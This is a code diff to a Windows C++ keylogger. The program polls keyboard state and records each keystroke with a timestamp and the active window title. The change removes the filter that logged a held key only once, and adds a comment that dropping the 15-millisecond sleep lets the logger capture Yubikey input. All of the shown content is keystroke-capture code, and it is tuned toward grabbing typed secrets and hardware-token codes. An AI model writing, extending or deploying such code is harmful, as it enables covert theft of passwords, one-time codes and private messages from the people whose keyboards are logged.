@@ -39,7 +39,7 @@ int main()
     HWND active_window;
     TCHAR window_title[2048];
     
-    std::chrono::time_point<std::chrono::system_clock> one, two = std::chrono::system_clock::now();
+    std::chrono::time_point<std::chrono::system_clock> two = std::chrono::system_clock::now();
     char tbuf[32];
     
     std::string character;
@@ -72,40 +72,29 @@ int main()
             // Key state has changed. LSB is set.
             if ( key_state == -32767 )
             {
-                std::int64_t td = std::chrono::duration_cast<std::chrono::microseconds>(two - one).count();
-                
-                // When a key is pressed and held, only log it once.
-                if ( td <= 46875 && ( keyit->second[0] == character || keyit->second[1] == character ) )
+                // Uppercase
+                if ( shift )
                 {
-                    ;
+                    std::cout  << keyit->second[1] << "|" 
+                               << tbuf             << "|\""; 
+                    std::wcout << window_title     << "\"\n";
+                    character =  keyit->second[1];
                 }
-                    
+                        
+                // Lowercase
                 else
                 {
-                    // Uppercase
-                    if ( shift )
-                    {
-                        std::cout  << keyit->second[1] << "|" 
-                                   << tbuf             << "|\""; 
-                        std::wcout << window_title     << "\"\n";
-                        character =  keyit->second[1];
-                    }
-                        
-                    // Lowercase
-                    else
-                    {
-                        std::cout  << keyit->second[0] << "|"
-                                   << tbuf             << "|\""; 
-                        std::wcout << window_title     << "\"\n";
-                        character =  keyit->second[0];
-                    }
+                    std::cout  << keyit->second[0] << "|"
+                               << tbuf             << "|\""; 
+                    std::wcout << window_title     << "\"\n";
+                    character =  keyit->second[0];
                 }
-                
-                one = two;
             }
         }
-        
-        // Milliseconds (requires XP)
+
+        // Sleep() requires WinXP or later (sleep 15 milliseconds)
+        // Can be removed entirely to capture Yubikey, etc.
+        // but may be CPU intensive
         Sleep(15);
     }
     
